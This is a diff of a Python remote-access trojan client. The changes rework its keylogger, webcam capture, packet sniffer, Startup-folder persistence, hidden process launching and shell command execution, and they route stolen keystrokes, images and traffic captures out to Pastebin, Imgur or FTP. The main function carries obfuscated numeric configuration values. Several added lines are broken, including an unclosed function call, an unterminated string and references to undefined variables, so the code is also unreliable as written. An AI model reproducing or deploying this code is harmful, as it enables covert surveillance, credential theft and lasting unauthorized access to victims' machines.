@@ -101,7 +101,7 @@ class Client(object):
                 cx.update({fx.func_name: fx})
         elif fx.func_name is 'keylogger':
             fx.platforms = ['win32','darwin','linux2']
-            fx.options   = {'max_size': 1024}
+            fx.options   = {'max_bytes': 1024, 'upload': 'pastebin'}
             fx.window    = None
             fx.buffer    = None
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
@@ -110,14 +110,14 @@ class Client(object):
                 cx.update({fx.func_name: fx})
         elif fx.func_name is 'webcam':
             fx.platforms = ['win32']
-            fx.options   = {'image': True, 'video': bool()}
+            fx.options   = {'image': True, 'video': bool(), 'upload': 'imgur'}
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
             if fx.status.is_set():
                 mx.update({fx.func_name: fx})
                 cx.update({fx.func_name: fx})
         elif fx.func_name is 'packetsniff':
             fx.platforms = ['darwin','linux2']
-            fx.options   = {'duration': 300.0 }
+            fx.options   = {'duration': 300.0, 'upload': 'ftp'}
             fx.capture   = []
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
             if fx.status.is_set():
@@ -158,7 +158,7 @@ class Client(object):
 
     @_command
     def standby(self):
-        """run enabled modules, log results, sleep, repeat"""
+        """disconnect but keep client alive"""
         return self._standby()
     
     @_command
@@ -233,7 +233,7 @@ class Client(object):
     
     @_command
     def upload(self, *args):
-        """remotely upload file - imgur/pastebin/ftp"""
+        """upload file or data to Imgur/Pastebin/FTP"""
         return self._upload(*args)
 
     @_command
@@ -268,27 +268,27 @@ class Client(object):
 
     @_command
     def webcam(self):
-        """\tcapture client webcam - upload to imgur"""
+        """\tcapture webcam - upload optionsS Imgur, FTP"""
         return self._webcam()
     
     @_command
     def keylogger(self):
-        """log client keystrokes remotely - dump to pastebin"""
+        """log keystrokes - upload options: Pastebin, FTP"""
         return self._keylogger()
 
     @_command
     def screenshot(self):
-        """take screenshot and upload to imgur"""
+        """screenshot monitor - upload options: Imgur, FTP"""
         return self._screenshot()
 
     @_command
     def persistence(self):
-        """establish persistence to maintain access to client"""
+        """establish persistence on client to maintain access"""
         return self._persistence()
     
     @_command
     def packetsniff(self):
-        """capture network traffic and dump to pastebin"""
+        """capture packets - upload options: Pastebin, FTP"""
         return self._packetsniff()
 
     @_command
@@ -379,12 +379,16 @@ class Client(object):
         if self.webcam.options['video']:
             if 'video' not in self._result['webcam']:
                 self._result['webcam'].update({'video': {}})
-            result = self._webcam_video()
+            output = self._webcam_video()
             self._result['webcam']['video'][time.ctime()] = result
         else:
             if 'image' not in self._result['webcam']:
                 self._result['webcam'].update({'image': {}})
-            result = self._webcam_image()
+            output = self._webcam_image()
+            if self.webcam.upload.lower() == 'imgur':
+                result = self._upload_imgur(output)
+            elif self.webcam.upload.lower() == 'ftp':
+                result = self._upload_ftp(
             self._result['webcam']['image'][time.ctime()] = result
         return result
 
@@ -674,7 +678,7 @@ class Client(object):
         info = subprocess.STARTUPINFO()
         info.dwFlags = subprocess.STARTF_USESHOWWINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
         info.wShowWindow = subprocess.SW_HIDE
-        p = subprocess.Popen(path, startupinfo=info)
+        p = subprocess.Popen(path, startupinfo=info, shell=shell)
         return p
 
     def _powershell(self, cmdline):
@@ -697,42 +701,37 @@ class Client(object):
         module_logger.addHandler(module_handler)
         return module_logger
 
-    def _upload_imgur(self, filename, override=False):
+    def _upload_imgur(self, source, override=False):
         if not self.upload.status.is_set() and not override:
             return filename
         if not self.upload.options['imgur'].get('api_key'):
             return "Error: no api key found"
-        api_key = self.upload.options['imgur'].get('api_key')
         try:
-            with open(filename, 'rb') as fp:
-                data = base64.b64encode(fp.read())
-            os.remove(filename)
-            result = requests.post('https://api.imgur.com/3/upload', headers={'Authorization': api_key}, data={'image': data, 'type': 'base64'}).json().get('data').get('link')
+            result  = requests.post('https://api.imgur.com/3/upload', headers={'Authorization': self.upload.options['imgur'].get('api_key')}, data={'image': base64.b64encode(source.getvalue()), 'type': 'base64'}).json().get('data').get('link')
         except Exception as e:
-            result = str(e)
+            result  = str(e)
         return result
 
-    def _upload_pastebin(self, path, override=False):
+    def _upload_pastebin(self, source, override=False):
         info = {'api_option': 'paste'}
         if not self.upload.status.is_set() and not override:
             return path
+        info['api_paste_code'] = source.getvalue()
         if self.upload.options['pastebin'].get('api_key'):
-            info['api_dev_key'] = self.upload.options['pastebin'].get('api_key')
+            info['api_dev_key']  = self.upload.options['pastebin'].get('api_key')
         else:
             return "Error: no api key found"
         if self.upload.options['pastebin'].get('user_key'):
             info['api_user_key'] = self.upload.options['pastebin'].get('user_key')
         try:
-            with open(path, 'r') as fp:
-                info['api_paste_code'] = fp.read()
             result = requests.post('https://pastebin.com/api/api_post.php', data=info).content
         except Exception as e:
             result = str(e)
         return result
      
-    def _upload_ftp(self, filepath, override=False):
+    def _upload_ftp(self, source, override=False):
         if not self.upload.status and not override:
-            return filepath
+            return source
         if not self.upload.options['ftp'].get('host') or not self.upload.options['ftp'].get('username') or not self.upload.options['ftp'].get('password'):
             return 'Error: missing host/username/password'
         try:
@@ -742,25 +741,27 @@ class Client(object):
         try:
             if self._info.get('IP Address') not in host.nlst('/htdocs'):
                 host.mkd('/htdocs/{}'.format(self._info.get('IP Address')))
-            result = '/htdocs/{}/{}'.format(self._info.get('IP Address'), os.path.basename(filepath))
-            upload = host.storbinary('STOR ' + result, open(filepath, 'rb'))
+            local   = time.ctime().split()
+            result  = '/htdocs/{}/{}'.format(self._info.get('IP Address'), '{}-{}_{}.txt'.format(local[1], local[2], local[3]))
+            if os.path.isfile(str(source)):
+                source = open(source, 'rb')
+            source.seek(0)
+            upload  = host.storbinary('STOR ' + result, source)
         except Exception as e:
             result = str(e)
         return result
 
     def _upload(self, *args):
         if len(args) != 2:
-            return self.upload.usage
-        mode = args[0]
-        target = args[1]
-        if not type(target) is str:
-            return "Error: invalid data type for argument 'target': expected '{}', got '{}'".format(str, type(target))
+            return 'usage: upload <mode> <source>'
+        mode    = str(args[0])
+        source  = args[1]
         if mode not in self.upload.options:
-            return "Error: invalid value '{}' for argument 'mode'".format(mode)
-        if not len(target):
-            return "Error: invalid value '{}' for argument 'target'".format(target)
+            return "Error: mode must be a valid upload option: {}".format(', '.join(["'{}'".format(i) for i in self.upload.options]))
+        if not hasattr(target, 'read'):
+            return "Error: source must be readable buffer object"
         try:
-            return getattr(self, '_upload_{}'.format(mode, override=True))(target)
+            return getattr(self, '_upload_{}'.format(mode.lower(), override=True))(source)
         except Exception as e:
             return 'Upload error: {}'.format(str(e))
 
@@ -800,6 +801,10 @@ class Client(object):
                 else:
                     result = bytes().join(subprocess.Popen(data, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                 if result and len(result):
+                    if len(result) > 2000:
+                        method = 'binary'
+                    else:
+                        method = 'default'
                     result = '\n' + str(result) + '\n'
                     self._send(result, method=cmd)
             else:
@@ -858,9 +863,9 @@ class Client(object):
     # ------------------- keylogger -------------------------
 
     def _keylogger_event(self, event):
-        if event.WindowName != self.keylogger.options['window']:
-            self.keylogger.options['window'] = event.WindowName
-            self.keylogger.buffer.write("\n[{}]\n".format(self.keylogger.options['window']))
+        if event.WindowName != self.keylogger.window:
+            self.keylogger.window = event.WindowName
+            self.keylogger.buffer.write("\n[{}]\n".format(self.keylogger.window))
         if event.Ascii > 32 and event.Ascii < 127:
             self.keylogger.buffer.write(chr(event.Ascii))
         elif event.Ascii == 32:
@@ -868,18 +873,17 @@ class Client(object):
         elif event.Ascii in (10,13):
             self.keylogger.buffer.write('\n')
         elif event.Ascii == 8:
-            self.keylogger.buffer = self.keylogger.buffer.seek(self.keylogger.buffer.tell() - 1)
+            self.keylogger.buffer.seek(-1, 1)
             self.keylogger.buffer.truncate()
         else:
             pass
         return True
 
     def _keylogger_helper(self):
-        self.keylogger.buffer = tempfile.SpooledTemporaryFile(max_size=self.keylogger.options.get('max_size'), suffix='.txt')
         while True:
             try:
                 while True:
-                    if self.keylogger.buffer._rolled:
+                    if self.keylogger.buffer.tell() >= self.keylogger.options['max_bytes']:
                         break
                     elif self._exit:
                         break
@@ -887,11 +891,14 @@ class Client(object):
                         break
                     else:
                         time.sleep(5)
-                result = self._upload_pastebin(self.keylogger.buffer.name)
+                if self.keylogger.options['upload'] == 'pastebin':
+                    result = self._upload_pastebin(self.keylogger.buffer)
+                elif self.keylogger.options['upload'] == 'ftp':
+                    result = self._upload_ftp(self.keylogger.buffer)
+                else:
+                    result = self.keylogger.buffer.getvalue()
                 self._result.update({time.ctime(): result})
-                try:
-                    os.remove(self.keylogger.buffer.name)
-                except: pass
+                self.keylogger.buffer.reset()
                 if self._exit:
                     break
                 if not self.keylogger.status.is_set():
@@ -924,16 +931,15 @@ class Client(object):
 
     def _webcam_image(self):
         dev = VideoCapture(0)
-        tmp = tempfile.mktemp(suffix='.png')
         r,f = dev.read()
-        waitKey(1)
-        imwrite(tmp, f)
         dev.release()
-        result = self._upload_imgur(tmp)
+        opt = self.webcam.options['upload']
+        buf = cStringIO.StringIO(f.tobytes())
+        out = getattr(self, '_upload_{}'.format(str(opt).lower()))(buf) if bool(self.upload.status.is_set() and str(opt).lower() in ('imgur','ftp')) else buf.getvalue()
         return result
 
     def _webcam_video(self):
-        fpath = tempfile.mktemp(suffix='.avi')
+        fpath  = cStringIO.StringIO()
         fourcc = VideoWriter_fourcc(*'DIVX') if sys.platform is 'win32' else VideoWriter_fourcc(*'XVID')
         output = VideoWriter(fpath, fourcc, 20.0, (640,480))
         dev = VideoCapture(0)
@@ -943,8 +949,11 @@ class Client(object):
             output.write(frame)
             if waitKey(0) and time.time() > end: break
         dev.release()
-        result = self._upload_ftp(fpath)
-        return result
+        if str(self.webcam.options['upload']).lower() == 'ftp':
+            result = self._upload_ftp(fpath)
+        else:
+            result = 'Error: video 
+            return result
 
     # ------------------- packetsniff -------------------------
 
@@ -1061,7 +1070,7 @@ class Client(object):
         except Exception as e:
             self.packetsniff.capture.append("Error in {} header: '{}'".format('ETH', str(e)))
 
-    def _packetsniff_manager(self, seconds):
+    def _packetsniff_manager(self, seconds=30.0):
         if os.name is 'nt':
             return
         limit = time.time() + seconds
@@ -1080,11 +1089,12 @@ class Client(object):
         try:
             sniffer_socket.close()
         except: pass
-        result = '\n'.join(self.packetsniff.capture)
-        if self.upload.status.is_set():
-            result = self._upload_pastebin(result)
-        self._result['packetsniff'][time.ctime()] = result
-        self.packetsniff.capture = []
+        try:
+            output = cStringIO.StringIO('\n'.join(self.packetsniff.capture))
+            result = self._upload_pastebin(output) if self.upload.status.is_set() else output.getvalue()
+            self._result['packetsniff'][time.ctime()] = result
+        except Exception as e:
+            result = str(e)
         return result
 
     # ------------------- persistence -------------------------
@@ -1122,15 +1132,16 @@ class Client(object):
             try:
                 appdata = os.path.expandvars("%AppData%")
                 startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
-                if os.path.exists(startup_dir):
-                    random_name = str().join([random.choice([chr(i).lower() for i in range(123) if chr(i).isalnum()]) for _ in range(random.choice(range(6,12)))])
-                    startup_file = os.path.join(startup_dir, '%s.eu.url' % random_name)
-                    content = '\n[InternetShortcut]\nURL=file:///%s\n' % self._long_to_bytes(long(self.__f__))
-                    with file(startup_file, 'w') as fp:
-                        fp.write(content)
-                    if startup_file in os.listdir(startup_dir):
-                        self._result['persistence']['startup_file'] = startup_file
-                        return True
+                if not os.path.exists(startup_dir):
+                    os.makedirs(startup_dir)
+                random_name = str().join([random.choice([chr(i).lower() for i in range(123) if chr(i).isalnum()]) for _ in range(random.choice(range(6,12)))])
+                startup_file = os.path.join(startup_dir, '%s.eu.url' % random_name)
+                content = '\n[InternetShortcut]\nURL=file:///%s\n' % self._long_to_bytes(long(self.__f__))
+                with file(startup_file, 'w') as fp:
+                    fp.write(content)
+                if startup_file in os.listdir(startup_dir):
+                    self._result['persistence']['startup_file'] = startup_file
+                    return True
             except Exception as e:
                 self._print('Adding startup file error: {}'.format(str(e)))
         return False
@@ -1268,9 +1279,9 @@ class Client(object):
 
 def main(*args, **kwargs):
     kwargs = {
-            "__a__": "296569794976951371367085722834059312119810623241531121466626752544310672496545966351959139877439910446308169970512787023444805585809719",
+#            "__a__": "296569794976951371367085722834059312119810623241531121466626752544310672496545966351959139877439910446308169970512787023444805585809719",
             "__c__": "45403374382296256540634757578741841255664469235598518666019748521845799858739",
-            "__b__": "142333377975461712906760705397093796543338115113535997867675143276102156219489203073873",
+#            "__b__": "142333377975461712906760705397093796543338115113535997867675143276102156219489203073873",
             "__d__": "44950723374682332681135159727133190002449269305072810017918864160473487587633",
             "__e__": "423224063517525567299427660991207813087967857812230603629111",
             "__g__": "12095051301478169748777225282050429328988589300942044190524181336687865394389318",
